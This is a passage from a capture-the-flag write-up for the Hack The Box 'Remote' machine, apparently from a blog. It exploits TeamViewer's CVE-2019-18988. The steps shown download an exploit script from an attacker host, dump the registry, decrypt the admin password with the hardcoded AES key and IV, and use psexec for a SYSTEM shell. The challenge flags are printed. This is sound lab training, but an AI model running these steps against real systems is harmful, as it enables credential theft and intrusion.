(such as in a file share or online), an attacker could then decrypt the required password to login to the system.&lt;/p&gt;
&lt;/blockquote&gt;

&lt;p&gt;Basically, TeamViewer7 uses a weak encryption algorithm that can be cracked. Upon some more research, I’ve found &lt;a href=&quot;https://github.com/mr-r3b00t/CVE-2019-18988&quot;&gt;this&lt;/a&gt; GitHub repo contaning the exploit. Somehow, we need to run it inside the CTF machine. To do that, save the exploit on our local machine, pop a Python server. On the host machine, let’s &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;cd C:\windows\temp\&lt;/code&gt; and then:&lt;/p&gt;

&lt;div class=&quot;language-bash highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;PS C:&lt;span class=&quot;se&quot;&gt;\w&lt;/span&gt;indows&lt;span class=&quot;se&quot;&gt;\t&lt;/span&gt;emp&amp;gt; Invoke-WebRequest &lt;span class=&quot;nt&quot;&gt;-Uri&lt;/span&gt; &lt;span class=&quot;s1&quot;&gt;&apos;http://10.10.16.14/exploit.bat&apos;&lt;/span&gt; &lt;span class=&quot;nt&quot;&gt;-OutFile&lt;/span&gt; &lt;span class=&quot;s1&quot;&gt;&apos;C:\windows\temp\exploit.bat&apos;&lt;/span&gt;
PS C:&lt;span class=&quot;se&quot;&gt;\w&lt;/span&gt;indows&lt;span class=&quot;se&quot;&gt;\t&lt;/span&gt;emp&amp;gt; &lt;span class=&quot;nb&quot;&gt;ls &lt;/span&gt;exploit.bat


    Directory: C:&lt;span class=&quot;se&quot;&gt;\w&lt;/span&gt;indows&lt;span class=&quot;se&quot;&gt;\t&lt;/span&gt;emp


Mode                LastWriteTime         Length Name                                                                  
&lt;span class=&quot;nt&quot;&gt;----&lt;/span&gt;                &lt;span class=&quot;nt&quot;&gt;-------------&lt;/span&gt;         &lt;span class=&quot;nt&quot;&gt;------&lt;/span&gt; &lt;span class=&quot;nt&quot;&gt;----&lt;/span&gt;                                                                  
&lt;span class=&quot;nt&quot;&gt;-a----&lt;/span&gt;         1/6/2024  11:56 PM           1148 exploit.bat 
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;

&lt;p&gt;To run the exploit, we type in &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;.\exploit.bat&lt;/code&gt;:&lt;/p&gt;

&lt;div class=&quot;language-bash highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;PS C:&lt;span class=&quot;se&quot;&gt;\w&lt;/span&gt;indows&lt;span class=&quot;se&quot;&gt;\t&lt;/span&gt;emp&amp;gt; .&lt;span class=&quot;se&quot;&gt;\e&lt;/span&gt;xploit.bat

C:&lt;span class=&quot;se&quot;&gt;\w&lt;/span&gt;indows&lt;span class=&quot;se&quot;&gt;\t&lt;/span&gt;emp&amp;gt;REM &lt;span class=&quot;c&quot;&gt;# CVE-2019-18988 &lt;/span&gt;

C:&lt;span class=&quot;se&quot;&gt;\w&lt;/span&gt;indows&lt;span class=&quot;se&quot;&gt;\t&lt;/span&gt;emp&amp;gt;REM &lt;span class=&quot;c&quot;&gt;# Teamviewer Local Privesc &lt;/span&gt;

C:&lt;span class=&quot;se&quot;&gt;\w&lt;/span&gt;indows&lt;span class=&quot;se&quot;&gt;\t&lt;/span&gt;emp&amp;gt;REM https://community.teamviewer.com/t5/Announcements/Specification-on-CVE-2019-18988/td-p/82264 

C:&lt;span class=&quot;se&quot;&gt;\w&lt;/span&gt;indows&lt;span class=&quot;se&quot;&gt;\t&lt;/span&gt;emp&amp;gt;reg query HKLM&lt;span class=&quot;se&quot;&gt;\S&lt;/span&gt;OFTWARE&lt;span class=&quot;se&quot;&gt;\W&lt;/span&gt;OW6432Node&lt;span class=&quot;se&quot;&gt;\T&lt;/span&gt;eamViewer&lt;span class=&quot;se&quot;&gt;\V&lt;/span&gt;ersion7 /v Version 

HKEY_LOCAL_MACHINE&lt;span class=&quot;se&quot;&gt;\S&lt;/span&gt;OFTWARE&lt;span class=&quot;se&quot;&gt;\W&lt;/span&gt;OW6432Node&lt;span class=&quot;se&quot;&gt;\T&lt;/span&gt;eamViewer&lt;span class=&quot;se&quot;&gt;\V&lt;/span&gt;ersion7
    Version    REG_SZ    7.0.43148


C:&lt;span class=&quot;se&quot;&gt;\w&lt;/span&gt;indows&lt;span class=&quot;se&quot;&gt;\t&lt;/span&gt;emp&amp;gt;reg query HKLM&lt;span class=&quot;se&quot;&gt;\S&lt;/span&gt;OFTWARE&lt;span class=&quot;se&quot;&gt;\W&lt;/span&gt;OW6432Node&lt;span class=&quot;se&quot;&gt;\T&lt;/span&gt;eamViewer&lt;span class=&quot;se&quot;&gt;\V&lt;/span&gt;ersion7 

HKEY_LOCAL_MACHINE&lt;span class=&quot;se&quot;&gt;\S&lt;/span&gt;OFTWARE&lt;span class=&quot;se&quot;&gt;\W&lt;/span&gt;OW6432Node&lt;span class=&quot;se&quot;&gt;\T&lt;/span&gt;eamViewer&lt;span class=&quot;se&quot;&gt;\V&lt;/span&gt;ersion7
    StartMenuGroup    REG_SZ    TeamViewer 7
    InstallationDate    REG_SZ    2020-02-20
    InstallationDirectory    REG_SZ    C:&lt;span class=&quot;se&quot;&gt;\P&lt;/span&gt;rogram Files &lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;x86&lt;span class=&quot;o&quot;&gt;)&lt;/span&gt;&lt;span class=&quot;se&quot;&gt;\T&lt;/span&gt;eamViewer&lt;span class=&quot;se&quot;&gt;\V&lt;/span&gt;ersion7
    Always_Online    REG_DWORD    0x1
    Security_ActivateDirectIn    REG_DWORD    0x0
    Version    REG_SZ    7.0.43148
    ClientIC    REG_DWORD    0x11f25831
    PK    REG_BINARY    BFAD2AEDB6C89AE0A0FD0501A0C5B9A5C0D957A4CC57C1884C84B6873EA03C069CF06195829821E28DFC2AAD372665339488DD1A8C85CDA8B19D0A5A2958D86476D82CA0F2128395673BA5A39F2B875B060D4D52BE75DB2B6C91EDB28E90DF7F2F3FBE6D95A07488AE934CC01DB8311176AEC7AC367AB4332ABD048DBFC2EF5E9ECC1333FC5F5B9E2A13D4F22E90EE509E5D7AF4935B8538BE4A606AB06FE8CC657930A24A71D1E30AE2188E0E0214C8F58CD2D5B43A52549F0730376DD3AE1DB66D1E0EBB0CF1CB0AA7F133148D1B5459C95A24DDEE43A76623759017F21A1BC8AFCD1F56FD0CABB340C9B99EE3828577371B7ADA9A8F967A32ADF6CF062B00026C66F8061D5CFF89A53EAE510620BC822BC6CC615D4DE093BC0CA8F5785131B75010EE5F9B6C228E650CA89697D07E51DBA40BF6FC3B2F2E30BF6F1C01F1BC2386FA226FFFA2BE25AE33FA16A2699A1124D9133F18B50F4DB6EDA2D23C2B949D6D2995229BC03507A62FCDAD55741B29084BD9B176CFAEDAAA9D48CBAF2C192A0875EC748478E51156CCDD143152125AE7D05177083F406703ED44DCACCD48400DD88A568520930BED69FCD672B15CD3646F8621BBC35391EAADBEDD04758EE8FC887BACE6D8B59F61A5783D884DBE362E2AC6EAC0671B6B5116345043257C537D27A8346530F8B7F5E0EBACE9B840E716197D4A0C3D68CFD2126E8245B01E62B4CE597AA3E2074C8AB1A4583B04DBB13F13EB54E64B850742A8E3E8C2FAC0B9B0CF28D71DD41F67C773A19D7B1A2D0A257A4D42FC6214AB870710D5E841CBAFCD05EF13B372F36BF7601F55D98ED054ED0F321AEBA5F91D390FF0E8E5815E6272BA4ABB3C85CF4A8B07851903F73317C0BC77FA12A194BB75999319222516
    SK    REG_BINARY    F82398387864348BAD0DBB41812782B1C0ABB9DAEEF15BC5C3609B2C5652BED7A9A07EA41B3E7CB583A107D39AFFF5E06DF1A06649C07DF4F65BD89DE84289D0F2CBF6B8E92E7B2901782BE8A039F2903552C98437E47E16F75F99C07750AEED8CFC7CD859AE94EC6233B662526D977FFB95DD5EB32D88A4B8B90EC1F8D118A7C6D28F6B5691EB4F9F6E07B6FE306292377ACE83B14BF815C186B7B74FFF9469CA712C13F221460AC6F3A7C5A89FD7C79FF306CEEBEF6DE06D6301D5FD9AB797D08862B9B7D75B38FB34EF82C77C8ADC378B65D9ED77B42C1F4CB1B11E7E7FB2D78180F40C96C1328970DA0E90CDEF3D4B79E08430E546228C000996D846A8489F61FE07B9A71E7FB3C3F811BB68FDDF829A7C0535BA130F04D9C7C09B621F4F48CD85EA97EF3D79A88257D0283BF2B78C5B3D4BBA4307D2F38D3A4D56A2706EDAB80A7CE20E21099E27481C847B49F8E91E53F83356323DDB09E97F45C6D103CF04693106F63AD8A58C004FC69EF8C506C553149D038191781E539A9E4E830579BCB4AD551385D1C9E4126569DD96AE6F97A81420919EE15CF125C1216C71A2263D1BE468E4B07418DE874F9E801DA2054AD64BE1947BE9580D7F0E3C138EE554A9749C4D0B3725904A95AEBD9DACCB6E0C568BFA25EE5649C31551F268B1F2EC039173B7912D6D58AA47D01D9E1B95E3427836A14F71F26E350B908889A95120195CC4FD68E7140AA8BB20E211D15C0963110878AAB530590EE68BF68B42D8EEEB2AE3B8DEC0558032CFE22D692FF5937E1A02C1250D507BDE0F51A546FE98FCED1E7F9DBA3281F1A298D66359C7571D29B24D1456C8074BA570D4D0BA2C3696A8A9547125FFD10FBF662E597A014E0772948F6C5F9F7D0179656EAC2F0C7F
    LastMACUsed    REG_MULTI_SZ    &lt;span class=&quot;se&quot;&gt;\0&lt;/span&gt;005056B0A059
    MIDInitiativeGUID    REG_SZ    &lt;span class=&quot;o&quot;&gt;{&lt;/span&gt;514ed376-a4ee-4507-a28b-484604ed0ba0&lt;span class=&quot;o&quot;&gt;}&lt;/span&gt;
    MIDVersion    REG_DWORD    0x1
    ClientID    REG_DWORD    0x6972e4aa
    CUse    REG_DWORD    0x1
    LastUpdateCheck    REG_DWORD    0x64c273d8
    UsageEnvironmentBackup    REG_DWORD    0x1
    SecurityPasswordAES    REG_BINARY    FF9B1C73D66BCE31AC413EAE131B464F582F6CE2D1E1F3DA7E8D376B26394E5B
    MultiPwdMgmtIDs    REG_MULTI_SZ    admin
    MultiPwdMgmtPWDs    REG_MULTI_SZ    357BC4C8F33160682B01AE2D1C987C3FE2BAE09455B94A1919C4CD4984593A77
    Security_PasswordStrength    REG_DWORD    0x3

HKEY_LOCAL_MACHINE&lt;span class=&quot;se&quot;&gt;\S&lt;/span&gt;OFTWARE&lt;span class=&quot;se&quot;&gt;\W&lt;/span&gt;OW6432Node&lt;span class=&quot;se&quot;&gt;\T&lt;/span&gt;eamViewer&lt;span class=&quot;se&quot;&gt;\V&lt;/span&gt;ersion7&lt;span class=&quot;se&quot;&gt;\A&lt;/span&gt;ccessControl
HKEY_LOCAL_MACHINE&lt;span class=&quot;se&quot;&gt;\S&lt;/span&gt;OFTWARE&lt;span class=&quot;se&quot;&gt;\W&lt;/span&gt;OW6432Node&lt;span class=&quot;se&quot;&gt;\T&lt;/span&gt;eamViewer&lt;span class=&quot;se&quot;&gt;\V&lt;/span&gt;ersion7&lt;span class=&quot;se&quot;&gt;\D&lt;/span&gt;efaultSettings

C:&lt;span class=&quot;se&quot;&gt;\w&lt;/span&gt;indows&lt;span class=&quot;se&quot;&gt;\t&lt;/span&gt;emp&amp;gt;reg query HKLM&lt;span class=&quot;se&quot;&gt;\S&lt;/span&gt;OFTWARE&lt;span class=&quot;se&quot;&gt;\T&lt;/span&gt;eamViewer&lt;span class=&quot;se&quot;&gt;\T&lt;/span&gt;emp /v SecurityPasswordExported 

C:&lt;span class=&quot;se&quot;&gt;\w&lt;/span&gt;indows&lt;span class=&quot;se&quot;&gt;\t&lt;/span&gt;emp&amp;gt;reg query HKLM&lt;span class=&quot;se&quot;&gt;\S&lt;/span&gt;OFTWARE&lt;span class=&quot;se&quot;&gt;\W&lt;/span&gt;OW6432Node&lt;span class=&quot;se&quot;&gt;\T&lt;/span&gt;eamViewer&lt;span class=&quot;se&quot;&gt;\V&lt;/span&gt;ersion7 

HKEY_LOCAL_MACHINE&lt;span class=&quot;se&quot;&gt;\S&lt;/span&gt;OFTWARE&lt;span class=&quot;se&quot;&gt;\W&lt;/span&gt;OW6432Node&lt;span class=&quot;se&quot;&gt;\T&lt;/span&gt;eamViewer&lt;span class=&quot;se&quot;&gt;\V&lt;/span&gt;ersion7
    StartMenuGroup    REG_SZ    TeamViewer 7
    InstallationDate    REG_SZ    2020-02-20
    InstallationDirectory    REG_SZ    C:&lt;span class=&quot;se&quot;&gt;\P&lt;/span&gt;rogram Files &lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;x86&lt;span class=&quot;o&quot;&gt;)&lt;/span&gt;&lt;span class=&quot;se&quot;&gt;\T&lt;/span&gt;eamViewer&lt;span class=&quot;se&quot;&gt;\V&lt;/span&gt;ersion7
    Always_Online    REG_DWORD    0x1
    Security_ActivateDirectIn    REG_DWORD    0x0
    Version    REG_SZ    7.0.43148
    ClientIC    REG_DWORD    0x11f25831
    PK    REG_BINARY    BFAD2AEDB6C89AE0A0FD0501A0C5B9A5C0D957A4CC57C1884C84B6873EA03C069CF06195829821E28DFC2AAD372665339488DD1A8C85CDA8B19D0A5A2958D86476D82CA0F2128395673BA5A39F2B875B060D4D52BE75DB2B6C91EDB28E90DF7F2F3FBE6D95A07488AE934CC01DB8311176AEC7AC367AB4332ABD048DBFC2EF5E9ECC1333FC5F5B9E2A13D4F22E90EE509E5D7AF4935B8538BE4A606AB06FE8CC657930A24A71D1E30AE2188E0E0214C8F58CD2D5B43A52549F0730376DD3AE1DB66D1E0EBB0CF1CB0AA7F133148D1B5459C95A24DDEE43A76623759017F21A1BC8AFCD1F56FD0CABB340C9B99EE3828577371B7ADA9A8F967A32ADF6CF062B00026C66F8061D5CFF89A53EAE510620BC822BC6CC615D4DE093BC0CA8F5785131B75010EE5F9B6C228E650CA89697D07E51DBA40BF6FC3B2F2E30BF6F1C01F1BC2386FA226FFFA2BE25AE33FA16A2699A1124D9133F18B50F4DB6EDA2D23C2B949D6D2995229BC03507A62FCDAD55741B29084BD9B176CFAEDAAA9D48CBAF2C192A0875EC748478E51156CCDD143152125AE7D05177083F406703ED44DCACCD48400DD88A568520930BED69FCD672B15CD3646F8621BBC35391EAADBEDD04758EE8FC887BACE6D8B59F61A5783D884DBE362E2AC6EAC0671B6B5116345043257C537D27A8346530F8B7F5E0EBACE9B840E716197D4A0C3D68CFD2126E8245B01E62B4CE597AA3E2074C8AB1A4583B04DBB13F13EB54E64B850742A8E3E8C2FAC0B9B0CF28D71DD41F67C773A19D7B1A2D0A257A4D42FC6214AB870710D5E841CBAFCD05EF13B372F36BF7601F55D98ED054ED0F321AEBA5F91D390FF0E8E5815E6272BA4ABB3C85CF4A8B07851903F73317C0BC77FA12A194BB75999319222516
    SK    REG_BINARY    F82398387864348BAD0DBB41812782B1C0ABB9DAEEF15BC5C3609B2C5652BED7A9A07EA41B3E7CB583A107D39AFFF5E06DF1A06649C07DF4F65BD89DE84289D0F2CBF6B8E92E7B2901782BE8A039F2903552C98437E47E16F75F99C07750AEED8CFC7CD859AE94EC6233B662526D977FFB95DD5EB32D88A4B8B90EC1F8D118A7C6D28F6B5691EB4F9F6E07B6FE306292377ACE83B14BF815C186B7B74FFF9469CA712C13F221460AC6F3A7C5A89FD7C79FF306CEEBEF6DE06D6301D5FD9AB797D08862B9B7D75B38FB34EF82C77C8ADC378B65D9ED77B42C1F4CB1B11E7E7FB2D78180F40C96C1328970DA0E90CDEF3D4B79E08430E546228C000996D846A8489F61FE07B9A71E7FB3C3F811BB68FDDF829A7C0535BA130F04D9C7C09B621F4F48CD85EA97EF3D79A88257D0283BF2B78C5B3D4BBA4307D2F38D3A4D56A2706EDAB80A7CE20E21099E27481C847B49F8E91E53F83356323DDB09E97F45C6D103CF04693106F63AD8A58C004FC69EF8C506C553149D038191781E539A9E4E830579BCB4AD551385D1C9E4126569DD96AE6F97A81420919EE15CF125C1216C71A2263D1BE468E4B07418DE874F9E801DA2054AD64BE1947BE9580D7F0E3C138EE554A9749C4D0B3725904A95AEBD9DACCB6E0C568BFA25EE5649C31551F268B1F2EC039173B7912D6D58AA47D01D9E1B95E3427836A14F71F26E350B908889A95120195CC4FD68E7140AA8BB20E211D15C0963110878AAB530590EE68BF68B42D8EEEB2AE3B8DEC0558032CFE22D692FF5937E1A02C1250D507BDE0F51A546FE98FCED1E7F9DBA3281F1A298D66359C7571D29B24D1456C8074BA570D4D0BA2C3696A8A9547125FFD10FBF662E597A014E0772948F6C5F9F7D0179656EAC2F0C7F
    LastMACUsed    REG_MULTI_SZ    &lt;span class=&quot;se&quot;&gt;\0&lt;/span&gt;005056B0A059
    MIDInitiativeGUID    REG_SZ    &lt;span class=&quot;o&quot;&gt;{&lt;/span&gt;514ed376-a4ee-4507-a28b-484604ed0ba0&lt;span class=&quot;o&quot;&gt;}&lt;/span&gt;
    MIDVersion    REG_DWORD    0x1
    ClientID    REG_DWORD    0x6972e4aa
    CUse    REG_DWORD    0x1
    LastUpdateCheck    REG_DWORD    0x64c273d8
    UsageEnvironmentBackup    REG_DWORD    0x1
    SecurityPasswordAES    REG_BINARY    FF9B1C73D66BCE31AC413EAE131B464F582F6CE2D1E1F3DA7E8D376B26394E5B
    MultiPwdMgmtIDs    REG_MULTI_SZ    admin
    MultiPwdMgmtPWDs    REG_MULTI_SZ    357BC4C8F33160682B01AE2D1C987C3FE2BAE09455B94A1919C4CD4984593A77
    Security_PasswordStrength    REG_DWORD    0x3

HKEY_LOCAL_MACHINE&lt;span class=&quot;se&quot;&gt;\S&lt;/span&gt;OFTWARE&lt;span class=&quot;se&quot;&gt;\W&lt;/span&gt;OW6432Node&lt;span class=&quot;se&quot;&gt;\T&lt;/span&gt;eamViewer&lt;span class=&quot;se&quot;&gt;\V&lt;/span&gt;ersion7&lt;span class=&quot;se&quot;&gt;\A&lt;/span&gt;ccessControl
HKEY_LOCAL_MACHINE&lt;span class=&quot;se&quot;&gt;\S&lt;/span&gt;OFTWARE&lt;span class=&quot;se&quot;&gt;\W&lt;/span&gt;OW6432Node&lt;span class=&quot;se&quot;&gt;\T&lt;/span&gt;eamViewer&lt;span class=&quot;se&quot;&gt;\V&lt;/span&gt;ersion7&lt;span class=&quot;se&quot;&gt;\D&lt;/span&gt;efaultSettings

C:&lt;span class=&quot;se&quot;&gt;\w&lt;/span&gt;indows&lt;span class=&quot;se&quot;&gt;\t&lt;/span&gt;emp&amp;gt;reg query HKLM&lt;span class=&quot;se&quot;&gt;\S&lt;/span&gt;OFTWARE&lt;span class=&quot;se&quot;&gt;\T&lt;/span&gt;eamViewer&lt;span class=&quot;se&quot;&gt;\V&lt;/span&gt;ersion7 

C:&lt;span class=&quot;se&quot;&gt;\w&lt;/span&gt;indows&lt;span class=&quot;se&quot;&gt;\t&lt;/span&gt;emp&amp;gt;reg query HKLM&lt;span class=&quot;se&quot;&gt;\S&lt;/span&gt;OFTWARE&lt;span class=&quot;se&quot;&gt;\W&lt;/span&gt;OW6432Node&lt;span class=&quot;se&quot;&gt;\T&lt;/span&gt;eamViewer&lt;span class=&quot;se&quot;&gt;\V&lt;/span&gt;ersion7 /v SecurityPasswordExported 



C:&lt;span class=&quot;se&quot;&gt;\w&lt;/span&gt;indows&lt;span class=&quot;se&quot;&gt;\t&lt;/span&gt;emp&amp;gt;reg query HKLM&lt;span class=&quot;se&quot;&gt;\S&lt;/span&gt;OFTWARE&lt;span class=&quot;se&quot;&gt;\W&lt;/span&gt;OW6432Node&lt;span class=&quot;se&quot;&gt;\T&lt;/span&gt;eamViewer&lt;span class=&quot;se&quot;&gt;\V&lt;/span&gt;ersion7 /v ServerPasswordAES  



C:&lt;span class=&quot;se&quot;&gt;\w&lt;/span&gt;indows&lt;span class=&quot;se&quot;&gt;\t&lt;/span&gt;emp&amp;gt;reg query HKLM&lt;span class=&quot;se&quot;&gt;\S&lt;/span&gt;OFTWARE&lt;span class=&quot;se&quot;&gt;\W&lt;/span&gt;OW6432Node&lt;span class=&quot;se&quot;&gt;\T&lt;/span&gt;eamViewer&lt;span class=&quot;se&quot;&gt;\V&lt;/span&gt;ersion7 /v ProxyPasswordAES 



C:&lt;span class=&quot;se&quot;&gt;\w&lt;/span&gt;indows&lt;span class=&quot;se&quot;&gt;\t&lt;/span&gt;emp&amp;gt;reg query HKLM&lt;span class=&quot;se&quot;&gt;\S&lt;/span&gt;OFTWARE&lt;span class=&quot;se&quot;&gt;\W&lt;/span&gt;OW6432Node&lt;span class=&quot;se&quot;&gt;\T&lt;/span&gt;eamViewer&lt;span class=&quot;se&quot;&gt;\V&lt;/span&gt;ersion7 /v LicenseKeyAES 



C:&lt;span class=&quot;se&quot;&gt;\w&lt;/span&gt;indows&lt;span class=&quot;se&quot;&gt;\t&lt;/span&gt;emp&amp;gt;reg query HKLM&lt;span class=&quot;se&quot;&gt;\S&lt;/span&gt;OFTWARE&lt;span class=&quot;se&quot;&gt;\W&lt;/span&gt;OW6432Node&lt;span class=&quot;se&quot;&gt;\T&lt;/span&gt;eamViewer&lt;span class=&quot;se&quot;&gt;\V&lt;/span&gt;ersion7 /v OptionsPassword 



C:&lt;span class=&quot;se&quot;&gt;\w&lt;/span&gt;indows&lt;span class=&quot;se&quot;&gt;\t&lt;/span&gt;emp&amp;gt;reg query HKLM&lt;span class=&quot;se&quot;&gt;\S&lt;/span&gt;OFTWARE&lt;span class=&quot;se&quot;&gt;\W&lt;/span&gt;OW6432Node&lt;span class=&quot;se&quot;&gt;\T&lt;/span&gt;eamViewer&lt;span class=&quot;se&quot;&gt;\V&lt;/span&gt;ersion7 /v PermanentPassword 



C:&lt;span class=&quot;se&quot;&gt;\w&lt;/span&gt;indows&lt;span class=&quot;se&quot;&gt;\t&lt;/span&gt;emp&amp;gt;REM CYBERCHEF RECIPE  

C:&lt;span class=&quot;se&quot;&gt;\w&lt;/span&gt;indows&lt;span class=&quot;se&quot;&gt;\t&lt;/span&gt;emp&amp;gt;REM AES_Decrypt&lt;span class=&quot;o&quot;&gt;({&lt;/span&gt;&lt;span class=&quot;s1&quot;&gt;&apos;option&apos;&lt;/span&gt;:&lt;span class=&quot;s1&quot;&gt;&apos;Hex&apos;&lt;/span&gt;,&lt;span class=&quot;s1&quot;&gt;&apos;string&apos;&lt;/span&gt;:&lt;span class=&quot;s1&quot;&gt;&apos;0602000000a400005253413100040000&apos;&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;}&lt;/span&gt;,&lt;span class=&quot;o&quot;&gt;{&lt;/span&gt;&lt;span class=&quot;s1&quot;&gt;&apos;option&apos;&lt;/span&gt;:&lt;span class=&quot;s1&quot;&gt;&apos;Hex&apos;&lt;/span&gt;,&lt;span class=&quot;s1&quot;&gt;&apos;string&apos;&lt;/span&gt;:&lt;span class=&quot;s1&quot;&gt;&apos;0100010067244F436E6762F25EA8D704&apos;&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;}&lt;/span&gt;,&lt;span class=&quot;s1&quot;&gt;&apos;CBC&apos;&lt;/span&gt;,&lt;span class=&quot;s1&quot;&gt;&apos;Hex&apos;&lt;/span&gt;,&lt;span class=&quot;s1&quot;&gt;&apos;Raw&apos;&lt;/span&gt;,&lt;span class=&quot;o&quot;&gt;{&lt;/span&gt;&lt;span class=&quot;s1&quot;&gt;&apos;option&apos;&lt;/span&gt;:&lt;span class=&quot;s1&quot;&gt;&apos;Hex&apos;&lt;/span&gt;,&lt;span class=&quot;s1&quot;&gt;&apos;string&apos;&lt;/span&gt;:&lt;span class=&quot;s1&quot;&gt;&apos;&apos;&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;})&lt;/span&gt;Decode_text&lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;s1&quot;&gt;&apos;UTF-16LE (1200)&apos;&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;)&lt;/span&gt; 
PS C:&lt;span class=&quot;se&quot;&gt;\w&lt;/span&gt;indows&lt;span class=&quot;se&quot;&gt;\t&lt;/span&gt;emp&amp;gt; The system was unable to find the specified registry key or value.
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;

&lt;p&gt;From this huge output, we find three things: first, the encrypted HEX password is &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;FF9B1C73D66BCE31AC413EAE131B464F582F6CE2D1E1F3DA7E8D376B26394E5B&lt;/code&gt;. Second, we have the AES encryption key, which is &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;0602000000a400005253413100040000&lt;/code&gt;. Finally, we have the IV, which is &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;0100010067244F436E6762F25EA8D704&lt;/code&gt;. We can go to &lt;a href=&quot;https://gchq.github.io&quot;&gt;Cyberchef&lt;/a&gt; and select AES decrypt recipe. Here is the result:&lt;/p&gt;

&lt;p&gt;&lt;img src=&quot;../figs/remote-htb5.png&quot; alt=&quot;cyberchef decrypt AES&quot; /&gt;&lt;/p&gt;

&lt;p&gt;Showing the admin password is &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;!R3m0te!&lt;/code&gt;.&lt;/p&gt;

&lt;h2 id=&quot;step-4---solving&quot;&gt;&lt;a href=&quot;#mindset-step4&quot;&gt;&lt;/a&gt;Step 4 - Solving!&lt;/h2&gt;

&lt;p&gt;Now that we have the admin password, we can use &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;psexec.py&lt;/code&gt;, as stated by the machine info, to get the SYSTEM shell. To do so, we simply run:&lt;/p&gt;

&lt;div class=&quot;language-bash highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;kaizen@celestial ~ &lt;span class=&quot;nv&quot;&gt;$ &lt;/span&gt;psexec.py &lt;span class=&quot;s1&quot;&gt;&apos;administrator:!R3m0te!@10.129.14.142&apos;&lt;/span&gt;
Impacket v0.9.24 - Copyright 2021 SecureAuth Corporation

&lt;span class=&quot;o&quot;&gt;[&lt;/span&gt;&lt;span class=&quot;k&quot;&gt;*&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;]&lt;/span&gt; Requesting shares on 10.129.14.142.....
&lt;span class=&quot;o&quot;&gt;[&lt;/span&gt;&lt;span class=&quot;k&quot;&gt;*&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;]&lt;/span&gt; Found writable share ADMIN&lt;span class=&quot;err&quot;&gt;$&lt;/span&gt;
&lt;span class=&quot;o&quot;&gt;[&lt;/span&gt;&lt;span class=&quot;k&quot;&gt;*&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;]&lt;/span&gt; Uploading file lAgjnpRc.exe
&lt;span class=&quot;o&quot;&gt;[&lt;/span&gt;&lt;span class=&quot;k&quot;&gt;*&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;]&lt;/span&gt; Opening SVCManager on 10.129.14.142.....
&lt;span class=&quot;o&quot;&gt;[&lt;/span&gt;&lt;span class=&quot;k&quot;&gt;*&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;]&lt;/span&gt; Creating service eGkl on 10.129.14.142.....
&lt;span class=&quot;o&quot;&gt;[&lt;/span&gt;&lt;span class=&quot;k&quot;&gt;*&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;]&lt;/span&gt; Starting service eGkl.....
&lt;span class=&quot;o&quot;&gt;[!]&lt;/span&gt; Press &lt;span class=&quot;nb&quot;&gt;help &lt;/span&gt;&lt;span class=&quot;k&quot;&gt;for &lt;/span&gt;extra shell commands
Microsoft Windows &lt;span class=&quot;o&quot;&gt;[&lt;/span&gt;Version 10.0.17763.107]
&lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;c&lt;span class=&quot;o&quot;&gt;)&lt;/span&gt; 2018 Microsoft Corporation. All rights reserved.

C:&lt;span class=&quot;se&quot;&gt;\W&lt;/span&gt;indows&lt;span class=&quot;se&quot;&gt;\s&lt;/span&gt;ystem32&amp;gt; &lt;span class=&quot;nb&quot;&gt;whoami
&lt;/span&gt;nt authority&lt;span class=&quot;se&quot;&gt;\s&lt;/span&gt;ystem
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;

&lt;p&gt;And voilà! We have our SYSTEM shell! Now, we retrieve all flags:&lt;/p&gt;

&lt;div class=&quot;language-bash highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;C:&lt;span class=&quot;se&quot;&gt;\W&lt;/span&gt;indows&lt;span class=&quot;se&quot;&gt;\s&lt;/span&gt;ystem32&amp;gt; &lt;span class=&quot;nb&quot;&gt;type &lt;/span&gt;c:&lt;span class=&quot;se&quot;&gt;\u&lt;/span&gt;sers&lt;span class=&quot;se&quot;&gt;\p&lt;/span&gt;ublic&lt;span class=&quot;se&quot;&gt;\u&lt;/span&gt;ser.txt
aa3d4bb0861760843cb76a9d9f92190a

C:&lt;span class=&quot;se&quot;&gt;\W&lt;/span&gt;indows&lt;span class=&quot;se&quot;&gt;\s&lt;/span&gt;ystem32&amp;gt; &lt;span class=&quot;nb&quot;&gt;type &lt;/span&gt;c:&lt;span class=&quot;se&quot;&gt;\u&lt;/span&gt;sers&lt;span class=&quot;se&quot;&gt;\a&lt;/span&gt;dministrator&lt;span class=&quot;se&quot;&gt;\d&lt;/span&gt;esktop&lt;span class=&quot;se&quot;&gt;\r&lt;/span&gt;oot.txt
a033160985b82a79d7188f9c1974a8fc
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;

&lt;h1 id=&quot;conclusion&quot;&gt;&lt;a href=&quot;#conclusions&quot;&gt;&lt;/a&gt;Conclusion&lt;/h1&gt;

